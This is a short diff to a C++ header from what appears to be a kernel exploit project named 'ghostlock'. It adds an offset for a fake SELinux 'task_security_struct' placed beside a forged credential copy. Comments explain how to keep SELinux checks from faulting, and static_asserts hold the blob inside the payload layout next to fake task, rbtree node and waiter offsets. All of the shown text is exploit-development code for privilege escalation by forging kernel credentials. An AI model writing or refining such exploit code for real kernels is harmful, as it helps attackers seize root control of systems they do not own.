@@ -34,6 +34,13 @@ inline constexpr std::size_t kRightNodeOffset = 0x1240;
 inline constexpr std::size_t kLeftNodeOffset = 0x1260;
 inline constexpr std::size_t kFakeTaskOffset = 0x1280;
 inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
+/* Fake `struct task_security_struct` for the forged credential copy, relative to
+ * the copy itself: the copy's `security` field must point at a *mapped* blob
+ * whose sid is a real SID, because selinux_* reads tsec->sid even under
+ * permissive mode (only the verdict is skipped, not the read).  It sits in the
+ * gap between the credential copy (0x1080 + 0xb0 = 0x1130) and the waiter
+ * (0x1180), so it holds for the TCP copy offset (0x6800 + 0xb0 = 0x68b0) too. */
+inline constexpr std::size_t kCredSecurityBlobDelta = 0xc0;
 inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
 inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
 
@@ -91,6 +98,11 @@ static_assert(payload::kLeftNodeOffset == 0x1260);
 static_assert(payload::kFakeTaskOffset == 0x1280);
 static_assert(payload::kTcpFakeTaskOffset == 0x5800);
 static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
+/* The security-blob slot must stay outside the credential copy (whose profile
+ * size is 0xb0 here) and below the waiter. */
+static_assert(payload::kCredSecurityBlobDelta >= 0xb0);
+static_assert(payload::kCredentialCopyOffset + payload::kCredSecurityBlobDelta + 8 <=
+              payload::kWaiterOffset);
 
 }  // namespace ghostlock::target
 
